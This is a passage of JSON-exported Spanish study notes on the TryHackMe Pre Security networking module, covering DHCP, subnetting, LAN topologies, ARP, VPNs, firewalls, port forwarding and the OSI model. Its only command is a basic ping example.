    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/2. Introduction to LAN/4. DHCP.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 2. Introduction to LAN",
    "content": "Las direccione IP pueden ser asignadas de forma manual, metiéndolas en los dispositivos, o automáticamente, más comúnmente utilizando un servidor DHCP (**D**ynamic **H**ost **C**onfiguration **P**rotocol).\n\nCuando un dispositivo se conecta a una red, si no ha sido asignado con una IP manualmente:\n\n1. Manda una petición (DHCP Discover) para ver si hay algún servidor DHCP en la red. \n2. El servidor (si lo hay) contesta entonces con una IP que el dispositivo podría usar (DHCP Offer). \n3. El dispositivo responde Diciendo que quiere esa IP (DHCP Request). \n4. Por último el servidor responde que la asignación ha sido completada de forma exitosa (DHCP ACK).\n\n![[004.png]]\n"
  },
  {
    "title": "0. Introduction to LAN",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/2-introduction-to-lan/0-introduction-to-lan/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/2. Introduction to LAN/0. Introduction to LAN.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 2. Introduction to LAN",
    "content": "[[1. Introducing LAN Topologies]]\n[[2. Intro to Subnetting]]\n[[3. ARP]]\n[[4. DHCP]]\n"
  },
  {
    "title": "2. Intro to Subnetting",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/2-introduction-to-lan/2-intro-to-subnetting/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/2. Introduction to LAN/2. Intro to Subnetting.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 2. Introduction to LAN",
    "content": "La subred es el término que se le da a la división de una red grande en redes más pequeñas. \nTomaremos un negocio como ejemplo, tenemos diferentes departamentos como:\n- Contabilidad.\n- Finanzas.\n- Recursos humanos.\n\n![[002.png]]\nLos administradores utilizan las subredes para categorizar y asignar partes específicas de la red a sus respectivas funciones. \nEl subnetting se consigue partiendo el número de hosts que caben en la red representado por un número llamado la máscara de subred (32 bits). Debemos acordarnos aquí de lo que vimos en [[3. Identifying Devices on a Network]]. \n\nLas subredes usan las direcciones IP de tres formas diferentes:\n\n- Identificar la dirección de red.\n- Identificar la dirección del host.\n- Identificar la gateway.\n\n| **Tipo**            | **Propósito**                                                                                               | **Explicación**                                                                                                                                          |\n| ------------------- | ----------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| Drección de red     | Esta dirección identifica el comienzo de la red actual y se usa para identificar la existencia de la misma. | Por ejemplo, un dispositivo con la IP 192.168.1.100 estará identificado en la red: 192.168.1.0                                                           |\n| Dirección de Host   | Esta dirección identifica hosts dentro de la red.                                                           | Un host de la red del ejemplo anterior podría ser: 192.168.1.100                                                                                         |\n| Gateway por defecto | Es la dirección reservada al dispositivo que manda la información hasta otra red (switch)                   | Cualquier información que viaje entre redes debe pasar por esta dirección primero. Normalmente la .1 y la .254 (0-255) están reservadas para el gateway. |\n\nEn tu red de casa es poco probable que haya más de 254 dispositivos conectados a la vez. De todas formas, si los hubiese, necesitarías otra subred.\nAdemás el subnetting provee:\n\n- Eficiencia.\n- Seguridad.\n- Control total.\n\nTomando como ejemplo un café, este tendrá dos subredes:\n\n1. Una para los empleados, cajas registradoras y otros dispositivos del local.\n2. Otra para el uso general del público."
  },
  {
    "title": "1. Introducing LAN Topologies",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/2-introduction-to-lan/1-introducing-lan-topologies/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/2. Introduction to LAN/1. Introducing LAN Topologies.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 2. Introduction to LAN",
    "content": "A lo largo de los años se han experimentado e implementado varios diseños de redes.\n\n<h2>Tipos de Topología</h2>\n<h3>Topología en estrella</h3>\nLa premisa principal es que los dispositivos están conectados individualmente a través de un dispositivo central. Es la topología más común hoy en día debido a su confiabilidad y escalabilidad.\n\n![[descargar (1).png]]\n\nVentajas:\n1. Muy escalable.\n2. Pocas probabilidad de fallo.\n\nDesventajas:\n1. Coste elevado.\n2. Mucho mantenimiento requerido.\n<h3>Topología de Bus</h3>\nSe basa en una conexión que se conoce como cable troncal. Es similar a las hojas de un árbol.\nDebido a que todos los datos viajan por la misma conexión de red, es propensa a volverse lenta y originar un cuello de botella.\n\n![[27e9ff166d2d4ad5436e27c8c9b62e6d.png]]\n\nVentajas:\n1. Coste reducido.\n2. Fácil configuración.\n\nDesventajas:\n1. Difícil de mantener (no se sabe dónde está el fallo).\n2. Poco escalable.\n\n----------------------\n<h3>Topología de Anillo</h3>\nTambién conocida como la topología de tokens. Los dispositivos están conectados entre sí para formar un bucle.\nCada uno de los dispositivos enviará los paquetes recibidos al siguiente dispositivo hasta llegar a su destino (eso si éste no tiene datos que enviar suyos primero).\n\n![[4cea7a4b48eacbd4db0b0d5e32068596.png]]\n\nVentajas:\n1. Poco cableado.\n2. Fácil configuración.\n\nDesventajas:\n1. Comunicación ineficiente.\n2. Poco escalable (un cable cortado resulta en la rotura total de la red).\n\n-----------------------\n<h2>¿Qué es un Switch?</h2>\nLos switches son dispositivos dedicados dentro de una red a agregar muchos otros dispositivos. Estos múltiples dispositivos se conectan a un puerto del switch. Los switches se encuentran, por lo general, en redes grandes teniendo grupos de 4, 8, 16, 32 y 64 puertos para la conexión de los dispositivos.\n\nSon más eficientes que los hubs/repetidores ya que toman nota de los dispositivos conectados y a qué puerto lo están. De esta manera, en vez de reenviar un paquete a todos los puertos como haría un hub, lo manda directamente a aquel en el que está el dispositivo destino.\n\n![[000.png]]\nLos switches y routers se pueden conectar los unos a los otros. Esto incrementa la fiabilidad y estabilidad de la red. Si un camino se tumba otro puede seguir funcionando. Aunque esto puede incrementar mínimamente la latencia de la red. *Un pequeño precio a pagar por una gran recompensa.*\n\n--------------\n<h2>¿Qué es un router?</h2>\nEl trabajo de un router es conectar redes y pasar la información entre ellas. Esto lo hace mediante una técnica llamada routing.\nEsta es un proceso mediante el cual se crea un camino entre redes para que la información pueda ser entregada de manera exitosa.\n\n![[001.png]]\n\n"
  },
  {
    "title": "3. ARP",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/2-introduction-to-lan/3-arp/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/2. Introduction to LAN/3. ARP.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 2. Introduction to LAN",
    "content": "Recordando [[3. Identifying Devices on a Network]], tenemos dos maneras de identificar dispositivos: IP (identificador lógico) y MAC (identificador físico).\nEl ARP (Address Resolution Protocol) es la tecnología responsable de vincular estas dos bajo un dispositivo.\nCuando un dispositivo quiere conectarse con otro, manda un broadcast a la red entera buscando ese dispositivo específico. Los dispositivos pueden usar ARP para encontrar la dirección MAC del dispositivo en cuestión.\n\n------------\n<h2>¿Cómo funciona ARP?</h2>\nCada dispositivo en una red tiene un \"índice\" para guardar información que se llama caché. En este contexto, la caché almacena los identificadores de otros equipos de la red.\n\nPara guardar la IP y la MAC juntas, ARP manda dos tipos de mensaje:\n\n1. ARP Request.\n2. ARP Reply.\n\nCuando un ARP Request se manda, un mensaje es broadcasted (mandado a todos) en la red al resto de dispositivos preguntando: \"¿Cuál es la dirección MAC que posee esta IP?\". Cuando el resto de dispositivos reciben ese mensaje, responden con un ARP Reply.\n![[003.png]]\n"
  },
  {
    "title": "5. Practical - Network Simulator",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/5-extending-your-network/5-practical-network-simulator/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/5. Extending your Network/5. Practical - Network Simulator.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 5. Extending your Network",
    "content": ""
  },
  {
    "title": "4. LAN Networking Devices",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/5-extending-your-network/4-lan-networking-devices/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/5. Extending your Network/4. LAN Networking Devices.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 5. Extending your Network",
    "content": "<h2>¿Qué es un Router?</h2>\n\nEl trabajo de un router es conectar redes y pasar información entre ellas. Lo hace haciendo routing.\n\nRouting es el nombre que se le da al proceso de transportar información entre redes. Implica crear un camino entre redes para que esta información pueda viajar entre ellas. Los routers operan en la capa 3 del modelo OSI. Permiten al administrador configurar varias reglas sobre el redireccionamiento de puertos o el firewall.\n\nImaginémonos un ordenador A conectado a un ordenador B mediante redes. Para que esas redes se conecten necesitamos routers. En concreto en este ejemplo hay dos. El camino que tomará la información depende de:\n![[005.png]]\n- ¿Qué camino es el más corto?\n- ¿Qué camino es más fiable?\n- ¿Qué camino tiene el medio más rápido?\n\n--------------------\n<h2>¿Qué es un Switch?</h2>\nUn switch es un dispositivo dedicado a red que provee de conexión a múltiples dispositivos.\n\nPueden operar bien en la capa 2 o en la 3 del modelo OSI. De todas formas, son exclusivos. Un switch de la capa 2 no puede operar en la capa 3.\n\n<h4>Switch Capa 2</h4>\nLos switches reenviarán los frames (marcos) a los dispositivos conectados usando sus direcciones MAC.\n\n![[006.png]]\n\nEstos switches son sólamente responsables de mandar los frames a los dispositivos correctos.\n<h4>Switch Capa 3</h4>\nEstos son más sofisticados que los de la capa 2 ya que pueden realizar algunas de las responsabilidades del router. Estos switches mandarán frames a los dispositivos y paquetes de route a otros dispositivos usando el protocolo IP.\n\nVeamos un ejemplo, hay dos IP's:\n\n- 192.168.1.1\n- 192.168.2.1\n\nUna tecnología llamada VLAN (Virtual Local Area Network) permite a dispositivos concretos dentro de una red estar partidos virtualmente. \n\n![[007.png]]\n\nDe esta manera se hace que los dos departamentos puedan acceder a internet, pero no puedan comunicarse uno con otro (aunque están conectados al mismo switch).\n\n[[1. What is Networking]]"
  },
  {
    "title": "3. VPN Basics",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/5-extending-your-network/3-vpn-basics/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/5. Extending your Network/3. VPN Basics.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 5. Extending your Network",
    "content": "Una VPN (Virtual Private Network) es una tecnología que permite dispositivos en diferentes redes comunicarse de forma segura creando un camino dedicado entre estos dispositivos (tunnel).\n\nPor ejemplo, sólo los dispositivos dentro de la misma red pueden estar comunicados directamente (dentro de un negocio). De todas formas, una VPN permite que las dos oficinas se conecten:\n\n![[004.png]]Los dispositivos conectados en la red #3 (VPN) siguen siendo parte de las redes #1 y #2. Algunos de los beneficios de usar VPN:\n\n| **Beneficio**                                                     | **Descripción**                                                                                                                                                                                            |\n| ----------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| Permite redes en localzaciones geográficas diferentes conectarse. | Por ejempo, un negocio con múltiples oficinas encontrará de ayuda la VPN pues eso significa que servidores o infraestructura pueden ser usados por otras oficinas.                                         |\n| Ofrece privacidad.                                                | La tecnología VPN usa encriptación para proteger la información. Esta encriptación es útil en lugares con wifi pública.                                                                                    |\n| Ofrece anonimato.                                                 | Los periodistas y activistas dependen muchas veces de la VPN para poder expresar sus ideas en países con libertad limitada.<br><br>De todas formas si el VPN guarda logs, es básicamente como no usar VPN. |\nTryHackMe usa una VPN para conectarse a las máquinas vulnerables sin hacerlas directamente accesibles en internet. Esto significa que:\n\n- Puedes interactuar de manera segura con las máquinas.\n- Los proveedores de servicios como ISP's no se piensan que estás atacando una máquina en internet (lo que es ilegal).\n- La VPN provee seguridad a TryHackMe ya que las máquinas vulnerables.\n\nAlgunas de las tecnologías VPN son:\n\n| **Tecnología VPN** | **Descripción**                                                                                                                                                                                                                                      |\n| ------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| PPP                | Esta tecnología es usada por PPTP para permitir la autentificación y proveer encriptación de la información. Las VPN's usan claves privadas y públicas (como SSH). <br><br>Esta tecnología no es capaz de dejar una red por sí misma (no routeable). |\n| PPTP               | Point-to-Point Tunneling Protocol (PPTP) es la tecnología que permite a la información de PPP viajar y dejar la red.<br><br>Es muy fácil de montar pero su encriptación es débil en comparación a otras tecnologías.                                 |\n| IPSec              | Internet Protocol Security encripta la información usando el marco de trabajo IP existente.<br><br>Es más difícil de montar pero también tiene considerablemente buena encriptación.                                                                 |\n"
  },
  {
    "title": "0. Extending your Network",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/5-extending-your-network/0-extending-your-network/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/5. Extending your Network/0. Extending your Network.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 5. Extending your Network",
    "content": "[[1. Introduction to Port Forwarding]]\n[[2. Firewalls 101]]\n[[3. VPN Basics]]\n[[4. LAN Networking Devices]]\n[[5. Practical - Network Simulator]]\n"
  },
  {
    "title": "2. Firewalls 101",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/5-extending-your-network/2-firewalls-101/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/5. Extending your Network/2. Firewalls 101.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 5. Extending your Network",
    "content": "un firewall es un dispositivo dentro de una red responsable d determinar qué tráfico tiene permitida la entrada y la salida. Es básicamente una frontera de seguridad. El administrador de la red puede configurar el firewall para permitir o no al tráfico entrar o salir basándose en:\n\n- ¿De dónde viene el tráfico?\n- ¿Hacia dónde va el tráfico?\n- ¿En qué puerto se maneja el tráfico?\n- ¿Qué protocolo utiliza el tráfico?\n\nLos firewalls realizan inspección de paquetes para responder a estas preguntas. Además vienen en un montón de formas. Puede ser un dispositivo de hardware dedicado, como en una red gigante, o un router como en  una red doméstica, hasta sofware, como *Snort*.\n\nCubriremos las dos categorías principales:\n\n| **Categoría de Firewall** | **Descripción**                                                                                                                                                                                                                                                                         |\n| ------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| Stateful                  | Este tipo de firewall usa toda la información de una conexión más que inspeccionar un paquete individual.<br><br>Consume muchos recursos en comparación a un firewall sin estado porque la toma de decisiones es dinámica.                                                              |\n| Stateless                 | Este tipo de firewall usa un set de reglas estáticas para determinar si los paquetes individuales son aceptados o no<br><br>Estos usan menos recursos, pero también son menos audaces.<br><br>De cualquier forma, estos frewalls son buenos recibiendo un elevado número de peticiones. |\n"
  },
  {
    "title": "1. Introduction to Port Forwarding",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/5-extending-your-network/1-introduction-to-port-forwarding/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/5. Extending your Network/1. Introduction to Port Forwarding.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 5. Extending your Network",
    "content": "El redireccionamiento de puertos es un componente esencial al conectar aplicaciones y servicios a internet. Sin él, los servicios y aplicaciones sólo estarían disponibles en los dispositivos en la misma red.\n\nTomaremos de ejemplo la siguiente red. En esta red, el dispositivo con IP 192.168.1.10 está corriendo un servidor web en el puerto 80. Sólo los dispositivos conectados a la misma red podrán acceder. Esto se llama intranet.\n![[002.png]]\n\nSi el administrador quisiera que fuera accesible para el reso del público, necesitaría implementar redireccionamiento de puertos.\n\n![[003.png]]\nCon este diseño, la red #2 ahora sería capaz de acceder al servidor web corriendo en la redi #1 usando la Ip pública de la red #1: 82.62.51.70 .\n\nEl redireccionamiento de puertos se configura en el router de la red."
  },
  {
    "title": "6. Layer 5 - Session",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/3-osi-model/6-layer-5-session/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/3. OSI Model/6. Layer 5 - Session.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 3. OSI Model",
    "content": "Una vez que la información ha sido correctamente traducido o formateado de la capa de presentación, la capa actual comenzará a crear y mantener la conexión al ordenador al que debe llegar la información. Cuando se establece la conexión, se crea una sesión que estará activa mientras dure la conexión.\n\nEsta capa también es la responsable de cerrar la conexión si no se ha usado en mucho tiempo o si se ha perdido. Además, la sesión puede tener checkpoints, de tal manera que si se pierde la información en cierto punto, sólo se tenga que mandar la información más reciente.\n\nLas sesiones son únicas, por lo que la información no puede viajar entre sesiones"
  },
  {
    "title": "7. Layer 6 - Presentation",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/3-osi-model/7-layer-6-presentation/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/3. OSI Model/7. Layer 6 - Presentation.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 3. OSI Model",
    "content": "La capa 6 es la capa en la que comienza a tener lugar la estandarización. Debido a que los desarrolladores de software pueden desarrollar cualquier software, los datos deben de manejarse de la misma manera.\n\nEsta capa actúa como traductor de datos hacia y desde la capa de aplicación (capa 7). El ordenador receptor también entenderá los datos enviados a un ordenador en un formato (por ejemplo un email) y aunque el ordenador emisor tenga un cliente diferente deben entenderse entre sí.\n\nLas funcionalidades de seguridad como la encriptación ocurren en este nivel (HTTPS)."
  },
  {
    "title": "4. Layer 3 - Network",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/3-osi-model/4-layer-3-network/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/3. OSI Model/4. Layer 3 - Network.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 3. OSI Model",
    "content": "La tercera capa del modelo OSI el la capa de red que es donde ocurren el routing y el reensamblaje de los datos.\n\nEl routing determina el camino óptimo para el viaje de los datos. Los protocolos que deciden este camino son:\n\n- OSPF (Open Shortest Path First).\n- RIP (Routing Information Protocol).\n\nLa ruta tomada es decidida en función de:\n\n- ¿Qué camino es el más corto?\n- ¿Qué camino es el más fiable?\n- ¿Cuál es el camino más rápido?\n\nEn este nivel todo es discutido vía IP."
  },
  {
    "title": "8. Layer 7 - Application",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/3-osi-model/8-layer-7-application/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/3. OSI Model/8. Layer 7 - Application.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 3. OSI Model",
    "content": "La capa 7 es la capa de aplicación. Implementa protocolos y reglas para decidir cómo tiene que interactuar el usuario con los datos enviados o recibidos.\nLas aplicaciones cotidianas como los clientes de correo electrónico, los navegadores o el software de navegación de archivos proporcionan una Graphical User Interface (GUI) amigable y gráfica. Otros protocolos incluyen DNS (Domain Name System), que es la forma en la que los nombres de las web se convierten en IP's."
  },
  {
    "title": "0. OSI Model",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/3-osi-model/0-osi-model/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/3. OSI Model/0. OSI Model.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 3. OSI Model",
    "content": "[[1. What is the OSI Model]]\n[[2. Layer 1 - Physical]]\n[[3. Layer 2 - Data Link]]\n[[4. Layer 3 - Network]]\n[[5. Layer 4 - Transport]]\n[[6. Layer 5 - Session]]\n[[7. Layer 6 - Presentation]]\n[[8. Layer 7 - Application]]\n[[9. Práctica - OSI Game]]\n"
  },
  {
    "title": "1. What is the OSI Model",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/3-osi-model/1-what-is-the-osi-model/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/3. OSI Model/1. What is the OSI Model.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 3. OSI Model",
    "content": "El modelo OSI (Open System Interconnection) es un modelo esencial usado en el networking ([[1. What is Networking]]). Este modelo crítico provee un marco de trabajo dictaminando cómo todos los dispositivos de red enviarán, recibirán e interpretarán la información.\n\nUno de los beneficios principales del modelo OSI es que los dispositivos tengan funciones y diseños diferentes en una red mientras se comunican con otros dispositivos. Los datos que siguen el modelo OSI pueden ser entendidos por otros dispositivos.\n\nLa encapsulación es el proceso mediante el cual información es añadida a los datos.\n\nEste modelo OSI consta de 7 capas que veremos a continuación:\n\n[[2. Layer 1 - Physical]]\n[[3. Layer 2 - Data Link]]\n[[4. Layer 3 - Network]]\n[[5. Layer 4 - Transport]]\n[[6. Layer 5 - Session]]\n[[7. Layer 6 - Presentation]]\n[[8. Layer 7 - Application]]\n"
  },
  {
    "title": "9. Práctica - OSI Game",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/3-osi-model/9-practica-osi-game/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/3. OSI Model/9. Práctica - OSI Game.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 3. OSI Model",
    "content": ""
  },
  {
    "title": "2. Layer 1 - Physical",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/3-osi-model/2-layer-1-physical/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/3. OSI Model/2. Layer 1 - Physical.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 3. OSI Model",
    "content": "Este nivel se refiere a los componentes físicos del hardware usado en el networking y es el más bajo que hay. Los dispositivos usan señales eléctricas para transmitir información entre ellos utilizando el sistema binario (0's y 1's)."
  },
  {
    "title": "3. Layer 2 - Data Link",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/3-osi-model/3-layer-2-data-link/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/3. OSI Model/3. Layer 2 - Data Link.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 3. OSI Model",
    "content": "La capa de data link se centra en el direccionamiento físico de la información. Recibe un paquete de la capa de red (network), incluida la IP y agrega la dirección física (MAC). Dentro de cada equipo hay una NIC (Network Interface Card) la cual viene con una dirección MAC única para identificarla.\n"
  },
  {
    "title": "5. Layer 4 - Transport",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/3-osi-model/5-layer-4-transport/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/3. OSI Model/5. Layer 4 - Transport.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 3. OSI Model",
    "content": "La capa 4 del modelo OSI juega un rol vital en transmitir información a través de la red. Cuando la información es enviada, sigue uno de los siguientes caminos:\n\n- TCP\n- UDP\n\n---------------\n<h2>TCP</h2>\nTransmission Control Protocol, pensado con fiabilidad y garantía como motivo, reserva una conexión constante entre los dos dispositivos mientras la información esté en camino. Además, TCP incorpora la comprobación de errores en su diseño. Esta es la forma en la que TCP garantiza que la información enviada a cachos en la capa 5 sea reensamblada en el mismo orden y sin alteraciones.\n\n| **Ventajas de TCP**                      | **Desventajas de TCP  <br>**                                                                                                              |\n| ---------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------- |\n| Garantiza que los datos estén correctos. | Requiere una conexión estable entre los dispositivos. Si un trozo de la información no es recibido, el paquete entero queda inutilizable. |\n| Capaz de sincronizar dos dispositivos.   | Una conexión lenta puede causar un cuello de botella en otro dispositivo.                                                                 |\n| Hace más comprobaciones para fiabilidad. | TCP es más lento que UDP por las comprobaciones que hace.                                                                                 |\nTCP es usado en compartir archivos, buscar en internet o enviar emails. Esto es porque los servicios requieren que la información mandada sea precisa.\n\n----------------\n<h2>UDP</h2>\n\nUser Datagram Protocol, no es tan avanzado como TCP y tampoco ofrece tantas funcionalidades.\n\n| **Ventajas de UDP**                                                                                              | **Desventajas de UDP**                                                     |\n| ---------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------- |\n| UDP mucho más rápido TCP.                                                                                        | A UDP no le importa si la información es recibida.                         |\n| UDP abandona la capa de aplicación para decidir si hay algún control sobre cómo de rápido se envían los paquetes | Conexiones inestables resultan en una experiencia nefasta para el usuario. |\n| UDP no reserva una conexión entre dispositivos como hace TCP.                                                    |                                                                            |\nUDP es útil en situaciones donde hay pequeñas piezas de información siendo mandadas. Por ejemplo ARP o DHCP (vistos en [[3. ARP]] y [[4. DHCP]]) o archivos muy grandes como streaming de video."
  },
  {
    "title": "2. What is the Internet",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/1-what-is-networking/2-what-is-the-internet/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/1. What is Networking/2. What is the Internet.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 1. What is Networking",
    "content": "Ahora que hemos explorado lo que es una red investigaremos internet.\nInternet es una red gigante que consta de muchas redes pequeñas dentro de sí misma. Usando nuestro ejemplo de la tarea anterior imaginemos que Alice hizo nuevos amigos (Zayn y Toby) a los que quiere presentar a sus otros amigos (Bob y Jim). El problema es que Alice es la única persona que habla el mismo idioma que Zayn y Bob por lo que tendrá que ser ella quien haga de mensajera.\n![[descargar.png]]\n\n-------------\nLa primera interacción de Internet fue ARPANET en la década de 1960. Sin embargo no fue hasta 1989 cuando apareció la **W**orld **W**ide **W**eb (WWW) gracias a Tim Bersners-Lee.![[descargar1.png]]\nEste es el esquema de Internet: ![[descargar2.png]]\n\nLas redes pequeñas que componen internet se llaman redes privadas mientras que las que conectan unas con otras son redes públicas, o Internet."
  },
  {
    "title": "1. What is Networking",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/1-what-is-networking/1-what-is-networking/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/1. What is Networking/1. What is Networking.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 1. What is Networking",
    "content": "Las redes son cosas conectadas, por ejemplo tu grupo de amigos. Las redes se pueden dar en todos los ámbitos de la vida:\n\n- El sistema de transporte de una ciudad.\n- Infraestructuras como la red eléctrica.\n- Sistemas postales.\n\nMás específicamente, en informática, las redes tienen la misma idea aplicada a los dispositivos tecnológicos. Una red puede estar formada desde 2 hasta millones de dispositivos.\n\n![[descargar.png]]"
  },
  {
    "title": "4. Ping (ICMP)",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/1-what-is-networking/4-ping-icmp/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/1. What is Networking/4. Ping (ICMP).md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 1. What is Networking",
    "content": "Ping usa el protocolo ICMP (Internet Control Message Protocol) para determinar la conexión entre dos dispositivos.\n\n```bash\nping -c 1 <ip/URL)>\n```\n\n![[Pasted image 20250411201247.png]]\n"
  },
  {
    "title": "3. Identifying Devices on a Network",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/1-what-is-networking/3-identifying-devices-on-a-network/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/1. What is Networking/3. Identifying Devices on a Network.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 1. What is Networking",
    "content": "Para comunicarse y mantener el orden, los dispositivos necesitan ser identificables e identificadores en la red.\nLos dispositivos en una red son muy similares a los humanos, en el hecho de que tenemos dos formas de ser identificados:\n- Nuestro nombre.\n- Nuestras huellas.\nPodemos llegar a cambiarnos el nombre, pero no podemos cambiar nuestras huellas. Los dispositivos son iguales:\n- Dirección IP.\n- Dirección MAC.\n\n----------------\n<h2>Direcciones IP</h2>\nUna dirección IP (Internet Protocol) puede ser usada como una manera de identificar un host en una red durante un periodo de tiempo durante el cual ese dispositivo y esa dirección están asociadas.\n\n| Octeto 1 | Octeto 2 | Octeto 3 | Octeto 4 |\n| -------- | -------- | -------- | -------- |\n| 192      | 168      | 1        | 1        |\n| 0-255    | 0-255    | 0-255    | 0-255    |\nEs un set de números divididos en en octetos. El valor de la IP se calcula con una técnica llamada *IP addressing y subnetting*. Lo que es importante de entender es que **las direcciones IP pueden cambiar de dispositivo a dispositivo pero no pueden estar simultáneamente más de una vez dentro de la misma red**.\n\nLas direcciones IP siguen un conjunto de reglas llamadas protocolos. Estos son el esqueleto del networking.\n\nUna red pública es usada para identificar los dispositivos en Internet mientras que una red privada es usada para identificar un dispositivo entre otros.\n\n| **Device Name** | **IP Address** | **IP Address Type** |\n| --------------- | -------------- | ------------------- |\n| DESKTOP-KJE57FD | 192.168.1.77   | Private             |\n| DESKTOP-KJE57FD | 